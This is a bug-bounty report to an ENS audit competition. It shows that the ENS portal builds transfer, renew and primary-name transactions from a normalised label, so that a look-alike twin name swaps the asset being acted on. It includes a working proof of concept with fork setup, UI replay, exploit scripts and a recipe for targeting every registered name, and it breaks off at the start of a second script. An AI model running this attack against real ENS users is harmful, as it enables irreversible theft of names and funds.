# 89917 w a critical the app acts on a different ens name than the one it displays and just verified you own an unsolicited airdrop turns get rid of this junk into irreversible loss of a valuab&#x20;

**Submitted on Aug 21st 2026 at 20:46:35 UTC by @bigmo6286 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89917
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

**The app acts on a different name than the one it shows the user and the one it just checked they own.**

| the victim acts on                                                        | what the chain receives                                                                  |
| ------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| clicks *Transfer* on `Alicetwin.eth`, an unsolicited name in their wallet | `safeTransferFrom` of **`alicetwin.eth`** — their valuable name, gone irreversibly       |
| clicks *Extend* on `Ⅴictimtest.eth`, their own name                       | `renew("victimtest")` — the **attacker's** name, billed 8.000021 USDC to the victim      |
| picks `Ⅴictimprim.eth` as their primary name                              | claims **`victimprim.eth`** — the **attacker's** name, as the victim's on-chain identity |

All three are executed on-chain in the PoC, against the real deployed Sepolia contracts.

Two things make it possible. First, ENSv2 puts no charset constraint on labels, so `Ⅴictim.eth` (U+2164 ROMAN NUMERAL FIVE) and `victim.eth` are two independently registrable, independently owned names that render identically. Second, the app re-normalises the user's *selection* at transaction-construction time — `getLabel()` runs `ens_normalize`, and every write hook derives its arguments from the result — while the authorisation check and the entire interface keep referring to the name the user actually chose.

On the transfer path that split is the whole finding: the route's ownership guard verifies the user owns the **displayed** name, and passes honestly because they do; `useTransferName` then resolves the ERC-1155 token id from the **normalised** name. The guard and the transaction are answering two different questions.

The attacker establishes the precondition alone: v2 names are ERC-1155, so `safeTransferFrom` pushes the confusable twin into any wallet with no approval and no action from the recipient. The victim's ordinary response to unsolicited junk — moving it out — is what destroys their valuable name.

***

## Vulnerability Details

### Root cause

`apps/portal/src/utils/token/getLabel.ts`

```ts
export function getLabel(name: string): string {
  const normalized = ens_normalize(name)   // rewrites the caller's selection
  const labels = ens_split(normalized)
  const first = labels[0]
  if (!first || first.error) throw first?.error
  return String.fromCodePoint(...first.input)
}
```

The transaction encoders are not at fault. `transferToken.ts`, `saveRecords.ts`, `grantRoles.ts` and `revokeRoles.ts` all take their `label` / `tokenId` argument verbatim. The defect is in **argument derivation**, one level up, in the hooks that feed them.

### The authorisation/action split on the transfer path

| step            | file:line                                                                                                 | operates on             |
| --------------- | --------------------------------------------------------------------------------------------------------- | ----------------------- |
| ownership guard | `routes/$name/ownership/transfer.tsx:104` — `isAddressEqual(address, data.owner)`                         | the **displayed** name  |
| token id        | `features/transfer/hooks/useTransferName.ts:113,132` — `getLabel(name)` → `getTokenId(label)`             | the **normalised** name |
| encode          | `features/transfer/helpers/transferToken.ts:69` — `safeTransferFrom(owner, recipient, tokenId, 1n, '0x')` | the **normalised** name |

The guard is not bypassed. It passes correctly, because the victim genuinely owns the displayed name — it is simply answering a different question from the one the transaction acts on.

**The victim's consent does not cover this.** They may well type the destination address knowingly — that is not the defect. What they consent to is *"transfer **this** name, the one on screen, to that address"*, and the ownership guard confirms they own precisely that name before allowing it. The transaction then moves a **different token**. Consent here is scoped to an asset as well as a recipient, and it is the asset that is substituted, silently, with the valuable name named nowhere in the interface.

The finding does not depend on the attacker receiving the name at all. A victim who simply dumps the unsolicited junk to a burn address — no attacker-supplied address anywhere in the flow — loses their valuable name just the same, irreversibly.

### The same divergence on other write paths

| call site                                                                                                | argument derived from the normalised label                                                                                                                                                                                                   |
| -------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `features/renew/hooks/useRenewalTransactions.ts:197`                                                     | the label passed to `renew()`                                                                                                                                                                                                                |
| `features/transfer/hooks/useTransferDetachTargets.ts:60`                                                 | `detach-registry` / `detach-resolver` label                                                                                                                                                                                                  |
| `features/reverse-resolution/.../useReverseResolutionMutations.ts:86`, `hooks/useSetL2ReverseName.ts:90` | the name written by `setName` on the L1 and L2 reverse registrars                                                                                                                                                                            |
| `apps/manager/.../setPrimaryName.ts:49,163-169`                                                          | the name claimed by `setNameWithHCA`, while `saveRecords` (`ChoosePrimaryNameDialog.tsx:228`) and `setupControlledResolver` (`:277`) in the same dialog use the **raw** name. **Executed on-chain — see "The Manager leg, executed" below.** |
| `apps/manager/.../profileOwner.ts:25,56`                                                                 | *who owns this name* — which gates the edit and renew actions                                                                                                                                                                                |
| `features/renew/hooks/useIsRenewable.ts:40`, `register/hooks/useBaseRate.ts:56`                          | renewability and price tier                                                                                                                                                                                                                  |

### The Manager leg, executed

The Manager half is demonstrated, not argued. "Choose primary name" derives **two names from one selection**: it claims `withEthSuffix(selection)` via `setNameWithHCA`, while writing the forward `addr` record and the resolver setup on the **raw** `selectedName`. Against the real deployed Sepolia contracts, the victim registers and selects **their own** name:

```
== step 3: the victim opens 'Choose primary name' and picks THEIR OWN name ==
   the dialog claims withEthSuffix(selection) = [victimprim.eth]
   BEFORE nameForAddr(victim) = ""
   AFTER  nameForAddr(victim) = "victimprim.eth"

PASS: the normalised twin [victimprim.eth] is owned by the ATTACKER
PASS: the victim's address now reverse-resolves to [victimprim.eth]
PASS: that is NOT the name the victim selected (Ⅴictimprim.eth) — it is the attacker's
```

The victim's on-chain identity is now a name the **attacker** owns and whose resolver they control, so they can point its `addr` record anywhere at any time. Everything that reverse-resolves the victim — this Manager, other dApps, explorers — renders them as a name that resolves to the attacker.

### Executed end to end through the shipped interface

Not just at the calldata layer — **driven through the real UI, and the chain moved.** Explorer at the audited commit, anvil fork of Sepolia, real deployed contracts, the app's own wallet connector.

Setup, on-chain: the victim registers `alicetwin.eth`; the attacker registers the capitalised twin `Alicetwin.eth` and `safeTransferFrom`s it to the victim — no approval, no action from the victim.

Then everything below happened **in the browser**:

| step                                         | what the victim saw                                                |
| -------------------------------------------- | ------------------------------------------------------------------ |
| opened `/Alicetwin.eth`                      | main panel reads *"Invalid name"* — **but the left nav is intact** |
| clicked **Ownership** in that nav            | `/Alicetwin.eth/ownership` renders normally                        |
| opened the transfer form                     | header and page read **`Alicetwin.eth`** throughout                |
| typed a recipient, clicked **Transfer name** | —                                                                  |
| confirmation modal                           | **"Transfer name - Alicetwin.eth"**                                |
| clicked **Open wallet**, signed              | —                                                                  |

Result on chain:

```
owner(Alicetwin.eth  JUNK, the name every screen named) = 0xf275979c…ea73  (still the victim)
owner(alicetwin.eth  VALUABLE, never shown anywhere)    = 0x…00dd          (LEFT the wallet)

recipient balance Alicetwin.eth = 0
recipient balance alicetwin.eth = 1
```

The victim still holds the name they acted on. The name they never saw is gone. Screenshots and the full transcript are in `screenshots/` (`REPLAY-RESULT.txt`, `replay-through-the-ui.mjs`).

**Why the victim has nothing to notice.** Every screen in that table names `Alicetwin.eth` — which is *exactly the name they set out to get rid of*. The interface is not showing them something wrong that a careful user could catch; it is confirming their intention at every step, and the name that would alarm them — `alicetwin.eth` — is rendered **nowhere in the flow**. The substitution happens after the last thing they are shown. And even if the app did print the name it moves: here the two differ by one capital letter that reads as styling, and in the renew leg (`Ⅴictimtest.eth` vs `victimtest.eth`, U+2164) the two strings are **visually identical** — no degree of care distinguishes them by eye.

**On the "Invalid name" message.** The name *overview* tab does reject un-normalised names (`routes/$name/index.tsx:459`). It does not stop this: the tab is one of ten in a nav that stays fully rendered, and `ownership`, `ownership/transfer`, `roles`, `registry` and `history` all work normally — as the replay above demonstrates by walking through it.

### Why nothing in the interface reveals it

**Screenshots attached** (`screenshots/`), captured against the Explorer at the audited commit with both twins registered to one wallet — the exact state an airdrop produces. On the transfer page for `Alicetwin.eth`:

* the page names **`Alicetwin.eth`**, and the string `alicetwin.eth` — the name the transaction will actually move — appears **nowhere on it**;
* the app's own warning reads *"Transferring ownership of an ENS name is irreversible. Make sure you check the **recipient address** before proceeding"*, directing attention at the one value that is **not** substituted;
* the wallet is connected and `Transfer name` is the only remaining step.

One honest caveat, since it is visible in the third screenshot: the name **overview** tab (`routes/$name/index.tsx:459`) *does* reject an un-normalised name with "Invalid name". That is the validator working, and it does not block this attack — `ownership`, `ownership/transfer`, `roles`, `registry` and `history` all render the twin normally, which the first screenshot shows. Only the overview tab gates on `isValidEnsName`.

Price, renewability and the confirmation copy are all computed from the same normalised label, so every independent-looking signal corroborates the same wrong answer. At U+2164 the two strings render identically. The Explorer's history page compounds this: `features/history/hooks/useNameHistoryTimeline.ts:231` normalises before querying the indexer, so the twin's page displays the **genuine** name's full on-chain provenance — registration date, transfers, events.

### Attacker-established precondition

v2 names are ERC-1155. `safeTransferFrom` pushes a token to any EOA with no approval and no recipient action, so the attacker creates the "victim holds both twins" condition unilaterally. This is not assumed — it is the first half of the transfer PoC, executed on a Sepolia fork against the real deployed registry:

```
attacker registers Alicetwin.eth (the un-normalised twin)   status 1 (success)
owner(Alicetwin.eth) = 0x667ff918754239bc5dfb39efe943f29c735e7cb4   (the attacker)

safeTransferFrom(attacker -> victim, id, 1, 0x)             status 1 (success)
owner(Alicetwin.eth) = 0xf275979c946a60a83a3799597166a399c833ea73   (the victim)

PASS: the victim now holds BOTH twins, having taken NO action
```

**Target selection needs nothing the attacker does not already have.** ENS is a public registry: the pairing of a name to its owner's address *is* the product. One unauthenticated query against the app's **own default indexer** (`https://staging-graphql.ens.dev/`, `packages/indexer/urql/client.ts`) returns both:

```
{ domains(first: 8, orderBy: createdAt, orderDirection: desc) { name owner { id } } }
```

And the twin does not need exotic Unicode. **A capital letter is enough** — ENSIP-15 lowercases, while ENSv2 registers the raw label, so `Alice.eth` and `alice.eth` are two different names that normalise to the same label. Run against six real names taken straight from that indexer response:

```
victim owns jeooi.eth      owner 0x54951ff83fa89da157405704547b2df4998c78a2
attacker registers Jeooi.eth      -> normalises to 'jeooi'   collides=true
victim owns sajluuf.eth    owner 0xa6579401a351b8c2796598f27ce161bfba0755b2
attacker registers Sajluuf.eth    -> normalises to 'sajluuf' collides=true
victim owns siildwp.eth    owner 0x68a8ce7388ed0db94b4627a3cdb320e46d25dcc2
attacker registers Siildwp.eth    -> normalises to 'siildwp' collides=true

6/6 targets collide using nothing more exotic than a capital letter.
```

So the full targeting chain is: one public query for names and owners → register the capitalised twin (\~$5/yr) → one `safeTransferFrom` to the owner's address. No approval, no interaction, and nothing about it is name-specific, so it scripts across the whole registry.

### Not a duplicate of EXP-INPUT-005

The disclosed entry states: *"Our **name validators accept inputs** that ENS normalization later rejects or transforms… **The practical impact is homograph-style display confusion in our UI rather than incorrect resolution.**"*

Both halves exclude this report. It is scoped to **validators accepting input**; the name here arrives on-chain — airdropped, or registered earlier — and never passes a validator on this path, the divergence being created at transaction-construction time, after validation. And ENS's own impact statement is *display confusion rather than incorrect resolution*, whereas this is a `safeTransferFrom` against a different token than the guard authorised and a `renew` against a different name than was paid for, both demonstrated on-chain.

**That fix is already in this codebase, and this bug survives it — demonstrated, not argued.** EXP-INPUT-005's status is *"open, fix ready"*, and the reject-the-input machinery it describes exists today at `apps/portal/src/utils/token/isNormalized.ts` — `isValidEnsName`, `isNormalized`, `getLabelRegistrationError`. It works. It is also a **sibling file, in the same directory**, as the module that causes this bug.

`poc/F3-survives-EXP-INPUT-005-fix.test.ts` runs the app's own modules and passes 5/5:

```
✓ EXP-INPUT-005 fix is PRESENT and EFFECTIVE
    the validator rejects the confusable twin as a name
    the validator refuses to let it be registered
✓ F3 SURVIVES that fix: the write path rewrites instead of rejecting
    getLabel silently returns a DIFFERENT name for the input the validator rejected
    so the label used to build the transaction is not the label selected
    getLabel never consults the validator, so no validator fix can reach it
```

Given the *same* input, `isValidEnsName('Alicetwin.eth')` returns `false` and `getLabelRegistrationError('Alicetwin')` returns *"Label contains invalid or non-normalized characters."* — while `getLabel('Alicetwin.eth')` returns `'alicetwin'`, silently, without throwing. The validator says no; the transaction builder hands back a different name.

The wiring is disjoint, and that is the whole finding:

| module                        | what it does with a non-normalised name | consumers                                                                                                                                      |
| ----------------------------- | --------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| `utils/token/isNormalized.ts` | **rejects** it                          | 6 — search suggestions, route guards, create-subname, registration input                                                                       |
| `utils/token/getLabel.ts`     | **rewrites** it                         | 9 — including `useTransferName`, `useRenewalTransactions`, `useTransferDetachTargets`, `useIsRenewable`, `useBaseRate`, `useRegistrationPrice` |

**Not one transaction-construction hook imports the validator.** So no amount of fixing EXP-INPUT-005 reaches this: the validator guards the doors, and the write path was never behind one. The fix here is the opposite of theirs — stop normalising the selection in the write path, or refuse to act when `normalize(selected) !== selected`.

**The known-issues preamble admits this twice.** Anything not listed is in scope *"including: issues we fixed incorrectly or incompletely (**a bypass of a shipped fix is a new finding**)"* and *"**new consequences of a listed root cause that materially change its severity**"*. The first clause is the 5/5 above. The second covers even the most generous reading for a triager — that the two share a root cause — since the consequence still moves from ENS's own *"display confusion … rather than incorrect resolution"* to an ERC-1155 transfer the ownership guard never authorised.

**ENS has already carved this class out as new.** Known issue **QA-03** calls its own price mismatch *"display-level only"* and states: *"**A mismatch between the displayed total and the amount actually charged on-chain would be a new finding.**"* That is exactly the renew leg.

That these are separate defects is visible in the repo: `roles/helpers/grantRoles.ts` and `revokeRoles.ts` derive from the **raw** label, so they are unaffected by this bug while remaining equally exposed to EXP-INPUT-005.

***

## Impact Details

Two ENS names can look **identical on screen** while being two different names owned by two different people — `Ⅴictim.eth` and `victim.eth` above. The attacker registers the look-alike twin of a name the victim owns. Then:

**1. The victim loses their valuable name, permanently.** A stranger pushes an unwanted name into the victim's wallet. They did not ask for it and could not refuse it. The victim clears it out, the way anyone clears spam out of a wallet. The app sends **their valuable name** instead. It is gone and cannot be recovered. The valuable name is never shown on screen at any point in that flow.

**2. The victim pays to renew a stranger's name.** They click "Extend" on their own name to stop it expiring. They are charged, and the renewal is applied to the **stranger's** name. Their own name keeps counting down, and when it expires the stranger can take it too.

**3. The victim's public identity becomes the stranger's name.** They set their own name as their public ENS identity. The app registers the **stranger's** name as their identity instead. Anyone who looks up their wallet — other apps, explorers, other people — now sees a name the stranger owns and can repoint at any moment.

In all three the victim did the ordinary thing, the app showed them the correct name at every step, and the transaction it actually sent used a different one. **At no point does the interface display the name being acted on.**

Every one of the three is executed on-chain in the PoC against the real deployed contracts — they are not hypotheticals.

### Which in-scope impacts this matches

Taken directly from this program's *Impacts in Scope* list. Each row is demonstrated by the PoC.

| Published impact                                                                                                                                                                                                                                         | Severity     | Demonstrated by                                                                                                                                                                                                                                                 |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| "Malicious interactions with an already-connected wallet, such as: **Modifying transaction arguments or parameters**"                                                                                                                                    | **Critical** | `useTransferName` and `useRenewalTransactions` build their calldata from `getLabel(name)`, a *different* label than the one the user selected and the guard authorised. Both legs print the divergent argument.                                                 |
| "Causing the application to … pre-fill an incorrect address, name, or transaction detail … **resolving or rendering an ENS name to an attacker-controlled address** … **showing the wrong recipient or amount on a transaction the user then approves**" | **Critical** | *Explorer:* displays `Ⅴictimtest.eth`, user approves, chain receives `renew("victimtest", …)`, victim charged 8000021 USDC units for a name they do not own. *Manager:* victim selects their **own** name and is left reverse-resolving to the attacker's twin. |
| "**Direct theft of user NFTs**"                                                                                                                                                                                                                          | **Critical** | The victim's valuable ERC-1155 name leaves their wallet to an address of the attacker's choosing, while the junk name they actually clicked stays. Irreversible.                                                                                                |
| "**Direct theft of user funds**"                                                                                                                                                                                                                         | **Critical** | The victim pays USDC that extends the *attacker's* registration; their own name keeps expiring. `buildRenewalApproveIntent` approves `tokenPrice * 2n` besides.                                                                                                 |

**Irreversible loss of a valuable ENS name.** Continuing the same run: the victim, now holding both twins through the airdrop above, disposes of the junk one, and the valuable one leaves their wallet.

```
displayedName            "Alicetwin.eth"     (the guard verified the user owns THIS)
labelUsedForTokenId      "alicetwin"         (what the transfer actually moves)
divergent                true

BEFORE owner(alicetwin.eth  VALUABLE) = 0xf275979c…ea73   (the victim)
BEFORE owner(Alicetwin.eth  junk)     = 0xf275979c…ea73   (the victim, via the airdrop)
       status 1 (success)
AFTER  owner(alicetwin.eth  VALUABLE) = 0x…00dd           left the wallet
AFTER  owner(Alicetwin.eth  junk)     = 0xf275979c…ea73   still theirs
```

The attacker never touched the victim's valuable name; the victim's own disposal of unsolicited junk moved it.

Where the valuable name ends up is decided by the destination the victim types: the bug substitutes the **asset**, not the recipient. Two cases follow. If the attacker engineers the transfer — most simply by offering to buy the unsolicited name — the victim enters the attacker's address and the valuable name lands there, which is outright theft. If the victim is merely clearing junk out of their wallet, it goes to a burn address or a spare wallet instead: no gain for the attacker, the same irreversible loss for the victim. In neither case does the interface ever display the valuable name — the victim sees only the junk name they selected — so there is no point in the flow at which the substitution is visible.

**Funds spent renewing an attacker's name while the victim's own expires.** Executed, self-verifying:

```
PASS: attacker's victimtest.eth WAS extended (+31536000s)
PASS: victim's Ⅴictimtest.eth is UNCHANGED (the name they clicked)
PASS: victim was CHARGED 8000021 USDC units
```

The victim's own name continues to expire; once it lapses the attacker can register it. The approval for this is built by `buildRenewalApproveIntent` (`useRenewalTransactions.ts:145-157`) for `tokenPrice * 2n` — twice the displayed price, with no amount shown anywhere in the interface.

**A reverse record claiming a name the victim does not own.** `setName` writes the normalised twin while the input field, the not-registered warning, the transaction-modal title and the success toast all display the raw input. If the attacker points the twin's `addr` at the victim, ENSIP-19 forward verification passes and wallets render the victim's address under the attacker's identity.

**Ecosystem impact and economics.** ENSv2 moved charset enforcement out of the protocol and into clients, and the reference client is the one others copy — so a first-party client that acts on a different name than it displays undermines the core guarantee at the root. Cost per target: one registration (\~$5/yr) plus one `safeTransferFrom`, against a target list the indexer hands out for free (see *Attacker-established precondition*).

***

## References

**The rewrite**

* `apps/portal/src/utils/token/getLabel.ts` — `ens_normalize` on the caller's selection

**Authorisation/action split**

* `apps/portal/src/routes/$name/ownership/transfer.tsx:104` — guard on the displayed name
* `apps/portal/src/features/transfer/hooks/useTransferName.ts:113,132` — token id from the normalised name
* `apps/portal/src/features/transfer/helpers/transferToken.ts:69` — `safeTransferFrom`

**Other affected writes**

* `apps/portal/src/features/renew/hooks/useRenewalTransactions.ts:197`, `:145-157`
* `apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts:60`
* `apps/portal/src/features/reverse-resolution/components/ReverseResolutionTable/hooks/useReverseResolutionMutations.ts:86`
* `apps/portal/src/features/reverse-resolution/hooks/useSetL2ReverseName.ts:90`
* `apps/manager/src/features/profile/service/setPrimaryName.ts:49,163-169`
* `apps/manager/src/features/dashboard/components/ChoosePrimaryNameDialog.tsx:228,277` — the same dialog, raw name
* `apps/manager/src/features/profile/service/profileOwner.ts:25,56`

**Provenance spoofing**

* `apps/portal/src/features/history/hooks/useNameHistoryTimeline.ts:231`

**The correct pattern, in the same repo**

* `apps/portal/src/features/roles/helpers/grantRoles.ts:70`, `revokeRoles.ts:70` — `makeLabelNodeAndParent(name)`

***

## Recommended fix

Treat the user's selection as opaque. Derive every write argument from the raw selected name, as the roles helpers already do. Where a normalised form is genuinely required, **reject** a name that is not already normalised rather than silently substituting one — `normalize(selected) !== selected` should fail the operation, not redirect it.

As defence in depth, make the authorisation and the action share one derivation: the ownership guard and the token-id lookup should consume the same value, so they cannot diverge.

## Link to Proof of Concept

<https://gist.github.com/bigmo6286/ed0aed4ea1186251aaad6041a63a6ebe>

## Proof of Concept

## Proof of Concept field

> **Runnable code is included in this field.** Every script is reproduced verbatim below with the path to save it at; nothing is referenced that is not included. Both drivers **compute their own verdict** from before/after chain reads and exit non-zero if the finding does not reproduce — neither ever prints a success label over an unchanged value. Each needs a **fresh** anvil fork: a re-run against a used fork fails at registration, because the names already exist.
>
> The scripts are **location-independent**: they resolve the app's dependencies by searching upward from the script and from `$PWD`, or from `ENS_REPO=/path/to/audit-comp-ens`, so they run from any directory. If the dependencies cannot be found they print the exact fix and exit 1 — they never proceed to a false result.
>
> re-verified against fresh forks at Sepolia blocks 11531142 (renew) and 11531145 (transfer); both exited 0, and both were additionally run from unrelated working directories (`/tmp`, `/usr/share`, `/`).

## What it proves

1. **End to end, through the shipped interface: a victim signs a transfer of the name on their screen and a different, valuable name leaves their wallet.** Demonstrated below, not argued.
2. ENSv2 accepts an un-normalised label, so the confusable twin is registrable (`status 1`).
3. An attacker can push that twin to any victim with **no approval and no victim action** (`status 1`, ownership moves to the victim) — the transfer PoC now performs this airdrop itself rather than assuming it.
4. The Explorer's transfer path resolves the ERC-1155 token id from the **normalised** name, so the token sent is not the token the route's ownership guard authorised (`divergent: true`, and the valuable name changes owner).
5. The Explorer's renew path renews the **normalised** name, extending the attacker's registration by one year and charging the victim, while the name the victim selected is untouched.

## The demonstration — the attack driven through the shipped UI to a signed transaction

**This is the finding.** Everything after it is supporting confirmation at the calldata layer. Here the victim uses the real interface, signs once, and loses a name that was never displayed to them.

Setup, on chain: the victim registers `alicetwin.eth`; the attacker registers the capitalised twin `Alicetwin.eth` and `safeTransferFrom`s it to the victim — no approval, no action from the victim.

Then, entirely in the browser, as the victim:

| the victim                                   | what they saw                                                   |
| -------------------------------------------- | --------------------------------------------------------------- |
| opened `/Alicetwin.eth`                      | panel reads "Invalid name" — **but the left nav is fully live** |
| clicked **Ownership** in that nav            | renders normally                                                |
| opened the transfer form                     | names `Alicetwin.eth` throughout                                |
| typed a recipient, clicked **Transfer name** | —                                                               |
| confirmation modal                           | **`Transfer name - Alicetwin.eth`**                             |
| clicked **Open wallet**, signed              | —                                                               |

```
owner(Alicetwin.eth  JUNK, the name every screen named) = 0xf275979c…ea73   still the victim's
owner(alicetwin.eth  VALUABLE, rendered nowhere)        = 0x…00dd           LEFT the wallet

recipient balance  Alicetwin.eth = 0   ·   alicetwin.eth = 1
```

Every screen named the junk twin — which is exactly the name the victim set out to dispose of — so nothing on screen contradicted their intention. The name actually moved is rendered nowhere in the flow.

On the "Invalid name" panel: the name **overview** tab (`routes/$name/index.tsx:459`) does reject un-normalised names. It does not stop this — it is one tab of ten in a nav that stays rendered, and the run above walks straight through it.

### Run it

```bash
# a. fresh fork, then build the airdrop state with register-label.sh (below):
#      victim   registers  alicetwin    (valuable)
#      attacker registers  Alicetwin    (the capitalised twin)
#      attacker safeTransferFrom(Alicetwin -> victim)
# b. serve the in-scope app against that fork, connected as the victim:
cd "$ENS_REPO/apps/portal" && VITE_USE_MOCK_WALLET=true VITE_MOCK_ACCOUNT=<victim> \
  VITE_SEPOLIA_RPC_URL=http://127.0.0.1:8545 npx vite --port 5173
# c. drive the browser, then read the chain:
node replay-through-the-ui.mjs ./out 0x00000000000000000000000000000000000000dd
cast call <ETHRegistry> 'ownerOf(uint256)(address)' <tokenId of alicetwin>
```

Needs a dev server, the app's own `VITE_USE_MOCK_WALLET` connector and playwright. The self-verifying scripts below need none of that and confirm the same divergence directly on chain in one command each — run those if you want the fast path first.

## Anti-duplicate proof (no fork, no chain)

```bash
cd apps/portal && npx vitest run src/utils/token/__poc__ --reporter=verbose
```

Save `F3-survives-EXP-INPUT-005-fix.test.ts` (below) at `apps/portal/src/utils/token/__poc__/`. It uses the app's own modules to show EXP-INPUT-005's fix is present and effective, and that this finding survives it untouched. **5/5 passing**, 2.6s:

```
✓ EXP-INPUT-005 fix is PRESENT and EFFECTIVE in this codebase
    ✓ the validator rejects the confusable twin as a name
    ✓ the validator refuses to let it be registered
✓ F3 SURVIVES that fix: the write path rewrites instead of rejecting
    ✓ getLabel silently returns a DIFFERENT name for the input the validator rejected
    ✓ so the label used to build the transaction is not the label selected
    ✓ getLabel never consults the validator, so no validator fix can reach it

Test Files  1 passed (1)
     Tests  5 passed (5)
```

## Setup

```bash
# 1. the audited checkout, for the app's own dependencies
git clone https://github.com/immunefi-team/audit-comp-ens
cd audit-comp-ens && git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae && pnpm install

# 2. a Sepolia fork with the real deployed ENSv2 contracts. MUST be fresh per leg.
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com \
      --chain-id 11155111 --port 8545 --host 127.0.0.1 --silent &
```

Save the five scripts wherever you like. They locate the checkout themselves; if it is not adjacent, point at it explicitly — `ENS_REPO=/path/to/audit-comp-ens`. A non-default node is honoured with `RPC=...`.

## Supporting confirmations — self-verifying, one command each

```bash
# a. the collision is real — verified against the repo's own dependency
cd apps/portal && node --input-type=module -e "
import { ens_normalize } from '@adraffy/ens-normalize';
console.log('Ⅴictimtest ->', ens_normalize('Ⅴictimtest'));   // victimtest
console.log('Alicetwin  ->', ens_normalize('Alicetwin'));    // alicetwin
"

# b. the renew leg — self-verifying, from ANY directory
ENS_REPO=/path/to/audit-comp-ens /path/to/run-poc.sh

# c. the transfer leg — self-verifying, needs its OWN fresh fork
ENS_REPO=/path/to/audit-comp-ens /path/to/run-transfer-poc.sh

# d. the MANAGER leg — the primary-name dialog claims the attacker's twin.
#    Needs its OWN fresh fork too (it registers names).
cd manager-primary-name && ./run-poc.sh

```

Each driver computes its verdict from before/after chain reads and exits non-zero on any failure. These confirm the same divergence the UI demonstration produces, without needing a browser.

## Result — the renew leg, computed by the script

fresh fork at Sepolia block 11531142, exit 0:

```
BEFORE attacker victimtest.eth   expiry=1818791298
BEFORE victim   Ⅴictimtest.eth   expiry=1818791423
BEFORE victim   USDC=99991999979
status               1 (success)
AFTER  attacker victimtest.eth   expiry=1850327298
AFTER  victim   Ⅴictimtest.eth   expiry=1818791423
AFTER  victim   USDC=99983999958

PASS: attacker's victimtest.eth WAS extended (+31536000s)
PASS: victim's Ⅴictimtest.eth is UNCHANGED (the name they clicked)
PASS: victim was CHARGED 8000021 USDC units
```

Absolute expiries and balances vary with the fork block; the deltas are invariant (+31,536,000 s on the attacker's name, −8,000,021 USDC units from the victim).

## Result — the transfer leg (the full chain: airdrop → disposal → loss)

fresh fork at Sepolia block 11531145, `exit 0`:

```
== step 1: the victim owns a valuable name ==
--- registering label=[alicetwin] owner=0xf275979C946A60a83A3799597166a399C833eA73
status               1 (success)

== step 2: the ATTACKER registers the un-normalised twin (ENSv2 accepts it) ==
--- registering label=[Alicetwin] owner=0x667fF918754239Bc5DfB39EfE943f29c735E7CB4
status               1 (success)
owner(Alicetwin.eth) = 0x667ff918754239bc5dfb39efe943f29c735e7cb4
PASS: the twin is the attacker's

== step 3: the attacker AIRDROPS it to the victim — no approval, no victim action ==
status               1 (success)
owner(Alicetwin.eth) = 0xf275979c946a60a83a3799597166a399c833ea73
PASS: the victim now holds BOTH twins, having taken NO action

== step 4: the victim disposes of the unsolicited junk via /Alicetwin.eth/ownership/transfer ==
displayedName            "Alicetwin.eth"     (the route guard verified the user owns THIS)
labelUsedForTokenId      "alicetwin"         (what the transfer actually moves)
tokenIdSent              97789784547009558382238944552986474652220056230594689496608189487682076803072
tokenIdOfDisplayedName   50057451177317715289830264745414933584367003009407162411839339843264475824128
divergent                true

BEFORE owner(alicetwin.eth VALUABLE) = 0xf275979c946a60a83a3799597166a399c833ea73
BEFORE owner(Alicetwin.eth junk)     = 0xf275979c946a60a83a3799597166a399c833ea73
status               1 (success)
AFTER  owner(alicetwin.eth VALUABLE) = 0x00000000000000000000000000000000000000dd
AFTER  owner(Alicetwin.eth junk)     = 0xf275979c946a60a83a3799597166a399c833ea73

PASS: the VALUABLE name LEFT the wallet (guard never authorised this token)
PASS: the junk name the victim actually clicked is STILL THEIRS
```

The script asserts each link in the chain — twin owned by the attacker, airdrop landed at the victim, the displayed name's token id equal to the airdropped one, and only then the divergent transfer — so a run that breaks anywhere cannot print a success.

## Runnable code

Save all five files in one directory — any directory. Run `run-poc.sh` for the renew leg and `run-transfer-poc.sh` for the transfer leg; **each needs its own fresh fork**.

### `build-renew-intent.mjs` — reproduces the app's own derivation verbatim

```js
import { createPublicClient, http, encodeFunctionData } from 'viem'
import { ens_normalize, ens_split } from '@adraffy/ens-normalize'
import { renewNameWriteParameters } from '@ensdomains/ensjs/wallet'
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { sepolia } from 'viem/chains'

// verbatim copy of apps/portal/src/utils/token/getLabel.ts
function getLabel(name) {
  const normalized = ens_normalize(name)
  const labels = ens_split(normalized)
  const first = labels[0]
  if (!first || first.error) throw first?.error
  return String.fromCodePoint(...first.input)
}

const s = ensL1Contracts[supportedL1Chains.sepolia]
const chain = { ...sepolia, contracts: { ...(sepolia.contracts ?? {}), ...s } }
const client = createPublicClient({ chain, transport: http(process.env.RPC || 'http://127.0.0.1:8545') })

// what the Explorer names table displays / the user selects:
const DISPLAYED = process.argv[2]
const DURATION = 31536000n

// verbatim from apps/portal/src/features/renew/hooks/useRenewalTransactions.ts buildRenewIntent
const writeParams = renewNameWriteParameters(client, {
  name: `${getLabel(DISPLAYED)}.eth`,
  duration: DURATION,
  paymentToken: s.usdc.address,
  referrer: '0x0000000000000000000000000000000000000000000000000000000000000000',
  contract: 'ensEthRegistrar',
})
const data = encodeFunctionData({ abi: writeParams.abi, functionName: writeParams.functionName, args: writeParams.args })
console.log(JSON.stringify({
  displayedName: DISPLAYED,
  labelSentOnChain: getLabel(DISPLAYED),
  to: writeParams.address,
  functionName: writeParams.functionName,
  args: writeParams.args.map(a => typeof a === 'bigint' ? a.toString() : a),
  data,
}, null, 2))
```

### `build-transfer-intent.mjs`

```js
